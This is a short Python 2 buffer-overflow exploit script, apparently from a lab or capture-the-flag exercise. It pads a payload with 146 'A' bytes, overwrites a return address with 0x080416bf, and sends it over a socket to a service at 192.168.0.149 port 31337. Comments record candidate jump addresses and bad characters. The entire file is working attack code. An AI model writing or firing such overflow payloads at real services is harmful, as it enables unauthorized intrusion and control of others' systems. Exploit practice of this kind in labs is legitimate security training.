#!/usr/bin/python
import sys, socket

#080414c3
#080416bf
shellcode = "A" * 146 + '\xbf\x16\x04\x08'

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(('192.168.0.149',31337))
        s.send((shellcode + '\n'))
        s.close()

except:
        print "Error Connecting to server"
        sys.exit()
#badchars'\x00\x0a'
